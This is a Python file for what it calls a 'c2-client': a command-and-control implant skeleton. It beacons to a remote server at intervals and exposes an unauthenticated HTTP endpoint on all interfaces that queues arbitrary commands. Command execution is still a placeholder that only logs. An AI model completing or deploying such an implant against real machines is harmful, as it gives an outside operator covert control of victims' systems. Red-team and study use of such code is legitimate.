import base64
import logging
import os
from multiprocessing import Process, Queue
from typing import List

import uvicorn
from beacon import beacon
from fastapi import FastAPI
from logger import LOGGING_CONFIG, setup_logger
from quit import quit_app
from schema import Command, Message, StatusType
from settings import BEACON_INTERVAL_SECONDS, REMOTE_SERVER


# @keyboard_interrupt_handler
def command_processor(queue: Queue, pids_to_kill: List[int]) -> None:
    while True:
        command = queue.get()
        logging.debug(command)
        if command == "exit":
            pids_to_kill.append(os.getpid())
            quit_app(pids_to_kill)
        # Replace this with your actual command execution logic
        logging.info(f"Running command: {command}")


def create_listener(command_queue: Queue) -> FastAPI:
    app = FastAPI()

    @app.post("/run_command")
    async def run_command(command: str):
        command_queue.put(command)
        return {"message": f"Command '{command}' added to the queue."}

    @app.post("/is_up", response_model=Message)
    async def is_up(command: Command) -> Message:
        # Need to check that it the identifier is not in the que
        return Message(
            identifier=command.identifier,
            status=StatusType.BEACON,
            result=base64.encodebytes(b"Hello"),
        )

    @app.post("/", response_model=None)
    async def get_beacon(msg: Message) -> None:
        print(msg)

    return app


if __name__ == "__main__":
    setup_logger("c2-client")
    beacon_process = Process(
        target=beacon,
        kwargs=dict(server=REMOTE_SERVER, interval=BEACON_INTERVAL_SECONDS),
    )
    beacon_process.start()

    command_queue: Queue = Queue()
    command_executer = Process(
        target=command_processor,
        kwargs=dict(
            queue=command_queue, pids_to_kill=[os.getpid(), beacon_process.pid]
        ),
    )
    command_executer.start()
    uvicorn.run(
        create_listener(command_queue),
        host="0.0.0.0",  # noqa: S104
        port=8080,
        log_config=LOGGING_CONFIG,
        # ssl_keyfile=str(Path("../keys/key.pem")),
        # ssl_certfile=Path("../keys/cert.pem"),
    )
    command_executer.join()
    beacon_process.join()
